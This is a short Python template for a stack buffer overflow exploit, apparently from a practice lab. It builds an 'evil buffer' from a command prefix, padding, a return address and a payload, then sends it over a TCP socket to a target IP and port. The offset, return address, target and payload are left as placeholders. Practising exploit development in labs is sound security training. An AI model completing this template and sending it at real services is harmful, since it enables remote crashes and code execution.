#!/usr/bin/env python3

import socket

# CHANGE this
ip = "<ip>"

# CHANGE this
port = <port>

# CHANGE this
prefix = "<OVERFLOWX >"

offset = 0
overflow = "A" * offset
retn = ""
padding = ""

# CHANGE this
payload = "<payload>"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")